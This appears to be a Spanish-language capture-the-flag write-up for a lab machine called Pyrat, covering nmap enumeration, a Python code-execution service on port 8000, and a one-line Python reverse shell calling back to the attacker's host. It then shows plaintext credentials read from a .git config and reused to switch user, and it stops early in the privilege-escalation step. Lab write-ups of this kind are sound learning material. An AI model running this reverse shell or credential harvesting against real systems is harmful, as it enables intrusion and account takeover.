# Introducción

Pyrat recibe curiosas respuestas del servidor HTTP, gracias a esto tenemos una vulnerabilidad de ejecución de código con python. Crafteando nuestro propio payload, es posible ganar shell en la máquina. Dentro de los directorios, el autor tiene que recuperar los archivos del usuario con las credenciales de acceso.

# Conectivdad

![image](https://github.com/user-attachments/assets/90129f4d-d4f1-4170-947c-fbe9d6032629)

# Enumeración

```
sudo nmap -sCV -T4 --min-rate 4000 10.10.236.19
Starting Nmap 7.80 ( https://nmap.org ) at 2025-01-24 09:41 GMT
Nmap scan report for 10.10.236.19
Host is up (0.031s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http-alt SimpleHTTP/0.6 Python/3.11.2
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, JavaRMI, LANDesk-RC, NotesRPC, Socks4, X11Probe, afp, giop: 
|     source code string cannot contain null bytes
|   FourOhFourRequest, LPDString, SIPOptions: 
|     invalid syntax (<string>, line 1)
|   GetRequest: 
|     name 'GET' is not defined
|   HTTPOptions, RTSPRequest: 
|     name 'OPTIONS' is not defined
|   Help: 
|_    name 'HELP' is not defined
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: SimpleHTTP/0.6 Python/3.11.2
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
```

- 22 / SSH
- 8000 / HTTP - Simple HTTP/0.6

Si probamos a conectarnos a la página, aunque sea con curl, netcat o nc 

![image](https://github.com/user-attachments/assets/6b5db52f-f3c7-4abc-a437-501b0d390cc0)

Vamos a ver si encontramos algun vector

Si nos metemos vía telnet

```
telnet ip puerto
```

COmprobamos comandos y por ejemplo si metemos un print("hello") nos saca un print con lo cuál yo metería una rev shell en python directmaente

Podemos hacerlo vía nc también si queremos no hay problema, nos vamos al reverse shell generator e intenramos sacarla, seguramente nos de eror por que como ya estamos dentro de python deberemos quitar los primero argumentos y que quede tal que así:

# Explotación

```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.172.19",9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
```

Una vez tengamos el listener estaremos dentro de la máquina y podremos enumerar

Si vamos enumerando archivos principales como el /opt por ejemplo encontraremos información relevante.

Primero de todo nos encontraremo en la ruta root, yo he hecho un listener con rlwrap osea que no tengo la necesidad de upgradear la shell, posteriormente enumeraremos por ejemplo opt ls /opt

Encotramos un fichero llamado /dev y dentro el .git

Aquí he encontrado el archivo config

```
www-data@Pyrat:/opt/dev/.git$ cat config
cat config
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[user]
    	name = Jose Mario
    	email = josemlwdf@github.com

[credential]
    	helper = cache --timeout=3600

[credential "https://github.com"]
    	username = think
    	password = _TH1NKINGPirate$_
```

Con estas credenciales podemos entrar a github, vamos a probar a hacer un su think porque en el directorio home esta este usuario

Estamos dentro de think

Sacamos la flag de usuario

# Escala de privilegios

En sudo -l -l vemos que no tenemos ningún acceso de sudo

Volviendo a lo anterior vemos que como era un archivo git vamos a jugar con lo mismo de git

```
think@Pyrat:/opt/dev$ git status
git status
On branch master
Changes not staged for commit:
  (use "git add/rm <file>..." to update what will be committed)
  (use "git restore <file>..." to discard changes in working directory)
	deleted:    pyrat.py.old

no changes added to commit (use "git add" and/or "git commit -a")
think@Pyrat:/opt/dev$
```



